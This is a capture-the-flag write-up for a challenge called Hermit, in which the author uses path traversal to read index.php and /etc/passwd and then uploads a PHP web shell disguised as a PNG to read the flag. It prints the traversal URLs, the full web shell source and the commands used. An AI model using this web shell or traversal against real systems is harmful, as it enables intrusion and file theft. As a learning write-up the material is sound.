# Hermit - Part 1

By [Siorde](https://github.com/Siorde)

## Description
Help henry find a new shell.
It is a website where we can upload an image and then display this image.
With that we need to get the flag that must be in a file on the host.

## Solution
After uploading my first image, i saw that in the URl we use the name of the image to display it in the browser. So i tried to specifie a path to get other files.
```
http://34.121.84.161:8086/show.php?filename=../index.php
```
Instead of the image i got the base64 of the index. So my first thougth was that we need to get the flag through this get_content.
I tried several path like ../flag, ../../../../flag, ../../../../root/flag.
All i got  was "no such file or directory", or "acces denied".
Willing to see how far we could go, i tried ../../../../etc/passwd, and i got it : 
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:106::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
hermit:x:1000:1000::/home/hermit:/bin/sh
```
I saw a user call "hermit", so i tried his home with ../../../../home/hermit/flag, and i got a "Is a directory". So I knew that the flag was there, but i could not guess the name of the file.
After a lot of try, i decided to try another approach.
I created a file name shell.png with this content : 
```
<form action="<?=$_SERVER['REQUEST_URI']?>" method="POST"><input type="text" name="x" value="<?=htmlentities($_POST['x'])?>"><input type="submit" value="cmd"></form><pre><? echo `{$_POST['x']}`; ?></pre><? die(); ?>
```
And i upload it on the server. I got a reverse shell, so from now it was really easy.
```
ls ../../../home/hermit/flag/
-> userflag.txt
cat ../../../home/hermit/flag/userflag.txt
-> UMASS{a_picture_paints_a_thousand_shells}
```
And there was the flag.
